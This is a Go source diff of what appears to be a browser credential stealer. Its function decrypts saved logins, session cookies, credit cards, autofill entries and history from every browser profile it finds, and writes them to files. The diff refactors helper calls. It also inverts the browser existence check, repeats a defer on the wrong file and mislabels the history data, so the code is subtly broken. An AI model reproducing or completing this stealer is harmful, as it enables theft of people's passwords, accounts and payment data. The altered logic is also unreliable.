@@ -4,7 +4,7 @@ import (
 	"fmt"
 	
 	"os"
-	"love/leno"
+	
 	
 )
 
@@ -31,7 +31,7 @@ var (
 )
 
 
-func RunCommandsAndWriteToFile(loginDataFileName, cookieDataFileName, creditCardsDataFileName, autofillDataFileName, DecryptHistoryDataName string) {
+func RunCommandsAndWriteToFile(loginDataFileName, cookieDataFileName, creditCardsDataFileName, autofillDataFileName, HistoryDataFileName string) {
 	loginDataFile, err := os.OpenFile(loginDataFileName, os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Printf("Failed to open or create login data file: %v\n", err)
@@ -59,49 +59,50 @@ func RunCommandsAndWriteToFile(loginDataFileName, cookieDataFileName, creditCard
 		return
 	}
 	defer autofillDataFile.Close()
-	DecryptHistoryData, err := os.OpenFile(DecryptHistoryDataName, os.O_CREATE|os.O_WRONLY, 0644)
+	HistoryDataFile, err := os.OpenFile(HistoryDataFileName, os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Printf("Failed to open or create history data file: %v\n", err)
 		return
 	}
 	defer autofillDataFile.Close()
-	WriteOutputToFile(DecryptHistoryData, "history data")
+	WriteOutputToFile(HistoryDataFile, "history data")
 	WriteOutputToFile(loginDataFile, "Starting data collection...\n\n")
 	WriteOutputToFile(cookieDataFile, "Cookie Data:\n\n")
 	WriteOutputToFile(creditCardsDataFile, "Credit Card Data:\n\n")
 	WriteOutputToFile(autofillDataFile, "Autofill Data:\n\n")
 
 	for browser, path := range browsers {
-		if !utils.CheckFileExist(path) {
+		if CheckFileExist(path) {
 			continue
 		}
 
 		profiles := GetProfiles(path)
-		localStateTemp := utils.CreateTempFile("Local State Temp")
-		utils.CopyFile(path+string(os.PathSeparator)+"Local State", localStateTemp)
+		localStateTemp := CreateTempFile("Local State Temp")
+		CopyFile(path+string(os.PathSeparator)+"Local State", localStateTemp)
 
 		WriteOutputToFile(loginDataFile, "Browser: %s", browser)
 
-		loginData := utils.DecryptLoginData(profiles, localStateTemp.Name())
+		loginData := DecryptLoginData(profiles, localStateTemp.Name())
 		WriteDataToFile(loginDataFile, "Login Data", loginData)
 
-		cookieData := utils.DecryptCookieData(profiles, localStateTemp.Name())
+		cookieData := DecryptCookieData(profiles, localStateTemp.Name())
 		WriteDataToFile(cookieDataFile, "Cookie Data", cookieData)
 
-		creditCardsData := utils.DecryptCreditCardsData(profiles, localStateTemp.Name())
+		creditCardsData := DecryptCreditCardsData(profiles, localStateTemp.Name())
 		WriteDataToFile(creditCardsDataFile, "Credit Cards Data", creditCardsData)
-		HistoryData := utils.DecryptHistoryData(profiles)
-		WriteDataToFile(DecryptHistoryData, "Credit Cards Data", HistoryData)
+		HistoryData := DecryptHistoryData(profiles)
+			WriteDataToFile(HistoryDataFile, "Credit Cards Data", HistoryData)
+	
 
-		autoFillData := utils.DecryptAutoFillData(profiles)
+		autoFillData := DecryptAutoFillData(profiles)
 		WriteDataToFile(autofillDataFile, "Autofill Data", autoFillData)
 
 		WriteOutputToFile(loginDataFile, "----------------------------------------------")
 
-		utils.CloseFile(localStateTemp)
+		CloseFile(localStateTemp)
 		_ = os.Remove(localStateTemp.Name())
 	}
-	WriteOutputToFile(DecryptHistoryData, "Data collection completed.")
+	WriteOutputToFile(HistoryDataFile, "Data collection completed.")
 	WriteOutputToFile(loginDataFile, "Data collection completed.")
 	WriteOutputToFile(cookieDataFile, "Cookie Data collection completed.")
 	WriteOutputToFile(creditCardsDataFile, "Credit Card Data collection completed.")
